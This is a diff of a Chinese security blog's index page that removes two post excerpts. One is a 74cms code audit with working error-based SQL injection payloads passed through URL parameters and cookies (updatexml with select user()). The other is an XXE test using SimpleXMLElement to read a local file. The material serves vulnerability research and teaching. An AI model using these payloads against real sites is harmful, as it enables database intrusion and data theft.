-<p>要想构造sql注入,需要闭合前面的双引号,但是文章开头我们说了I函数的过滤规则是过滤双引号的,这时候我们就需要寻找一处不经过I函数的或不过滤双引号的地方来构造漏洞。</p>
-<p>测试代码:</p>
-<pre><code>#Application\Home\Controller\IndexController.class.php
-public function index($id){//直接接收的参数$id不经过I函数过滤
-M(&apos;test_user&apos;)-&gt;field(&apos;id,name&apos;)-&gt;where(array(&apos;id&apos; =&gt; $id))-&gt;find();
-        echo M(&apos;test_user&apos;)-&gt;getLastSql();
-</code></pre><p>payload:</p>
-<pre><code>http://127.0.0.1:84/index.php?m=home&amp;c=index&amp;a=index&amp;id[0]=match&amp;id[1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0)-- a
-</code></pre><p>利用:<br><img src="http://static.zybuluo.com/chhyx/4wga2ajqcvsn9itkplwlmcfn/image_1cp97gkt7g831hsb60ahpiigo3g.png" alt="image_1cp97gkt7g831hsb60ahpiigo3g.png-90.9kB"></p>
-<p>##<strong>漏洞利用:</strong><br>在74cms中寻找形如寻找形如<code>M()-&gt;where($id)--&gt;xx</code>,只要where中参数可控且不会过滤双引号即可。<br>我们在编辑器内搜索相关代码调试,得到4处可利用的点。</p>
-<p>1.<code>upload\Application\Home\Controller\AjaxPersonalController.class.php</code><br><code>$company_id</code> 函数直接接收的参数,不受过滤规则的约束,可控且无过滤</p>
-<pre><code>#AjaxPersonalController.class.php 137行
-public function company_focus($company_id){
-    if(!$company_id){
-        $this-&gt;ajaxReturn(0,&apos;请选择企业！&apos;);
-    }
-    $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
-    $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
-}
-</code></pre><p>跟进<code>add_focus()</code>函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
-<p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
-<pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
-</code></pre><p><code>$order_id</code>函数直接接收的参数 不受过滤规则的约束<br>可控且无过滤</p>
-<pre><code>public function order_pay_finish($order_id){
-$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
-    ...
-}
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/vogy2h9r4ttmtfm44urvgnfy/image_1cp8qjt291cs21urq1ohr1onmjivat.png" alt="image_1cp8qjt291cs21urq1ohr1onmjivat.png-91.4kB"></p>
-<p>3.<code>upload\Application\Home\Controller\MembersController.class.php</code></p>
-<pre><code>#MembersController.class.php 220行
-public function register(){
-        ...
-        if(IS_POST &amp;&amp; IS_AJAX){
-            $data[&apos;reg_type&apos;] = I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
-            $array = array(1 =&gt; &apos;mobile&apos;,2 =&gt; &apos;email&apos;);
-            $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
-
-            if($data[&apos;reg_type&apos;] == 1){//进入
-                $data[&apos;mobile&apos;] = I(&apos;post.mobile&apos;,0,&apos;trim&apos;);//注意
-                 //判断验证码
-            ...
-
-            if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
-                $uc_user = cookie(&apos;members_uc_info&apos;);
-                $data = array_merge($data,$uc_user);//合并数组
-
-                $passwordVerify = $data[&apos;password&apos;];
-            }
-            ...
-            // 若手机号重复且勾选了解绑原帐号
-            if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
-                $data[&apos;unbind_mobile&apos;] = I(&apos;post.unbind_mobile&apos;,0,&apos;intval&apos;);
-                if($data[&apos;unbind_mobile&apos;]){
-                    $repeat = M(&apos;Members&apos;)-&gt;where(array(&apos;mobile&apos;=&gt;$data[&apos;mobile&apos;]))-&gt;select();//漏洞触发点
-</code></pre><p>漏洞利用条件:</p>
-<pre><code>a.IS_POST &amp;&amp; IS_AJAX
-b.bind&apos; == $ucenter
-c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
-d.$data[&apos;unbind_mobile&apos;] 存在
-</code></pre><p>这里的漏洞参数<code>$data[&#39;mobile&#39;]</code> 是可控的<br>虽然<code>$data[&#39;mobile&#39;]</code>是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对<code>cookie</code>接收的参数进行了合并,这样我们就可以利用<code>cookie</code>方式来传递我们的sql语句来进行注入</p>
-<p>payload分析:</p>
-<pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
-POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
-headers:Content-Type: application/x-www-form-urlencoded
-        X-Requested-With: XMLHttpRequest         //满足AJAX操作
-
-Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][16][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
-<p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
-<p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
-<pre><code>public function oauth_reg(){
-
-        if (cookie(&apos;members_bind_info&apos;)) {
-
-            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
-
-        }else{
-            $this-&gt;error(&apos;第三方授权失败，请重新操作！&apos;);
-        }
-        //第三方帐号绑定
-        $username = I(&apos;post.username&apos;,&apos;&apos;,&apos;trim&apos;);
-        $password = I(&apos;post.password&apos;,&apos;&apos;,&apos;trim&apos;);
-        $passport = $this-&gt;_user_server();
-        ...
-    }
-
-        else{//进入
-            $user = $passport-&gt;_user;//获取个人信息
-            ...//uid不可控 所以这里不可利用
-        }
-        ...
-        $info = M(&apos;MembersBind&apos;)-&gt;where(array(&apos;type&apos;=&gt;$user_bind_info[&apos;type&apos;],&apos;uid&apos;=&gt;$uid))-&gt;find();//触发点
-</code></pre><p>payload:</p>
-<pre><code>header：Content-Type: application/x-www-form-urlencoded
-       //表明提交的表单数据编码为键值对,用&amp;分隔
-
-Cookie: members_bind_info[type][0]=match; members_bind_info[type][19][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
-
-POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
-</code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
 
           
         
@@ -2316,144 +2487,6 @@ if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XO
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/" itemprop="url">代码审计Day3 - 实例化任意对象漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T23:15:41+08:00">
-                2018-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>##<strong>Day 3 - Snow Flake</strong></p>
-<p>###题目名字:雪花<br>代码如下:<br><img src="http://static.zybuluo.com/chhyx/3skmkh8igvlxdywp9qfrzdr8/image_1cnrfif3p1clakuvd7p1s0g1muv9.png" alt="image_1cnrfif3p1clakuvd7p1s0g1muv9.png-213.8kB"></p>
-<p>###<strong>漏洞产生</strong>:这里的代码存在两个问题<br>1.文件包含漏洞 <code>class_exists($controllerName)</code>当用class_exists()这个函数时 它将会默认调用antoload()这个函数 由于类名我们可控 所以会造成文件包含</p>
-<p>我们看下class_exists()函数</p>
-<blockquote>
-<p><strong>class_exists()</strong>  (PHP 4, PHP 5, PHP 7)<br>定义:class_exists — 检查指定的类是否已定义。<br>参数:bool class_exists ( string \$class_name [, bool \$autoload = true ] )</p>
-</blockquote>
-<p>class_exists() 默认将会尝试调用 <code>__autoload</code>，如果不想让 class_exists() 调用 <code>__autoload</code>，可以将 <code>autoload</code> 参数设为 FALSE。<br>2.在代码中的第九行,由于实例化的对象名<code>$controllerName</code>以及传入类的参数名<code>$data</code>是我们可以控制的 我们就可以去调用PHP内置类<code>SimpleXMLElement</code>来执行xxe攻击读取任意文件</p>
-<p>测试代码:</p>
-<pre><code> &lt;?php
-
-$xml = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT methodName ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///C:/sec/1.txt&quot;&gt;]&gt;&lt;methodCall&gt; &lt;methodName&gt;&amp;xxe;&lt;/methodName&gt;&lt;/methodCall&gt;&apos;;
-
-$xml_class = new SimpleXMLElement($xml,LIBXML_NOENT);
-var_dump($xml_class);
-
-?&gt;
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/gl70z7his5l5e30ssvenwdwl/image_1cnrhc09s50p1f7311rv9k8ah51l.png" alt="image_1cnrhc09s50p1f7311rv9k8ah51l.png-59kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2504,7 +2537,7 @@ var_dump($xml_class);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
